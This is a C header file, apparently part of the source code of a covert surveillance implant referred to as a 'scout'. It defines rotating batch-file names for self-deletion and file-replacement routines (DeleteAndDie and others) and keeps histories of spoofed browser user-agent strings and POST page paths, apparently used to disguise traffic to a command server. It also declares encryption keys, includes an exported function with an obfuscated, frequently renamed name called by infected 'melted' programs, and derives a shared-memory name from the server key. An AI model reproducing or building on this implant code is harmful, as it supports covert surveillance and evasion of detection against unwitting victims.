#ifndef _VERSION_H_
#define _VERSION_H_

#define BUILD_VERSION 10

/* 
	BATCH_FILE HISTORY

	98355.bat	
	02322.bat	
	76833.bat	
*/

#define BATCH_FILE_1  L"437890.bat"	//DeleteAndDie			in file main.cpp
#define BATCH_FILE_2  L"124904.bat"	//CreateDeleteBatch		in file main.cpp
#define BATCH_FILE_3  L"391294.bat"	//CreateReplaceBatch	in file main.cpp

/* 
	USER_AGENT HISTORY

	Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0
	Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.7.10) Gecko/20050716	
	Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)	
*/

#define USER_AGENT L"Mozilla/5.0 (Windows NT 6.1; rv:27.3) Gecko/20130101 Firefox/27.3"					 


/* 
	POST_PAGE HISTORY
	
	/rss.asp
*/

#define POST_PAGE  L"/home.php"

PCHAR GetScoutSharedMemoryName();

//use only in one file
#ifdef _GLOBAL_VERSION_FUNCTIONS_

extern BYTE pServerKey[32];
extern BYTE pConfKey[32];
extern BYTE pSessionKey[20];
extern BYTE pLogKey[32];
extern BOOL bLastSync;

BOOL	uMelted = FALSE;
PULONG	uSynchro;

/*
	EXPORT HISTORY
	jfk31d1QQ
	reuio841001a
	pqjjslanf
	robertlee
*/

__declspec(dllexport) PWCHAR eflmakfil(PULONG pSynchro) // questa viene richiamata dai meltati
{
#ifdef _DEBUG
	OutputDebugString(L"[+] Setting uMelted to TRUE\n");
#endif
	
	PWCHAR pScoutName;
	
	uMelted = TRUE;
	uSynchro = pSynchro;

	pScoutName = (PWCHAR)VirtualAlloc(NULL, strlen(SCOUT_NAME)*sizeof(WCHAR) + 2*sizeof(WCHAR), MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
	MultiByteToWideChar(CP_ACP, MB_PRECOMPOSED, SCOUT_NAME, strlen(SCOUT_NAME), pScoutName, strlen(SCOUT_NAME) + 2);

	return pScoutName;
}

/*	SHARED MEMORY HISTORY

	pServerKey[6], pServerKey[5], pServerKey[4], pServerKey[3], pServerKey[2], pServerKey[1], pServerKey[0]);
*/

PCHAR GetScoutSharedMemoryName()
{
	CHAR strFormat[] = { '%', '0', '2', 'X', '%', '0', '2', 'X', '%', '0', '2', 'X', '%', '0', '2', 'X', '%', '0', '2', 'X', '%', '0', '2', 'X', '%', '0', '2', 'X', '%', '0', '2', 'X', '%', '0', '2', 'X', '\0' };
	PCHAR pName = (PCHAR) malloc(20);
	memset(pName, 0x0, 20);

	_snprintf_s(pName, 
		20, 
		_TRUNCATE, 
		strFormat, 		
		pServerKey[5], pServerKey[6], pServerKey[5], pServerKey[3], pServerKey[4], pServerKey[2], pServerKey[1], pServerKey[0], pServerKey[2]);

	return pName;
}

#endif


#endif